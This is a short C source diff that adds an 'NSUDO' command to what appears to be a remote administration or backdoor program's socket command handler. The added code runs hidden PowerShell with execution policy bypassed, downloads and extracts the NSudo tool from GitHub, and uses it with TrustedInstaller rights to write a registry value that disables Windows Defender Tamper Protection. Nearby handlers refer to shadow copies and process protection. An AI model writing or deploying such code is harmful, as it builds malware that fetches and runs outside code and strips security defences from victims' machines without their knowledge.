@@ -197,6 +197,19 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         sys_check_antivirus();
         result = "[Security check complete]";
     }
+    else if (strcmp(cmd, "NSUDO") == 0) {
+        const char *ps = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \""
+            "$zip = Join-Path $env:TEMP 'NSudo.zip'; "
+            "$out = Join-Path $env:TEMP 'NSudo'; "
+            "Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All.zip' -OutFile $zip; "
+            "Expand-Archive -Path $zip -DestinationPath $out -Force; "
+            "$exe = Join-Path $out 'x64\\NSudo.exe'; "
+            "if (Test-Path $exe) { "
+            "& $exe -U:T -ShowWindowMode:Hide reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features' /v TamperProtection /t REG_DWORD /d 4 /f; "
+            "Write-Host 'Tamper Protection disabled'; "
+            "} else { Write-Host 'NSudo.exe not found after extraction'; }\"";
+        result = sys_run_command(ps);
+    }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
         sys_spawn_shadow_copy();
         /* Start watchdog only once, when user explicitly deploys */
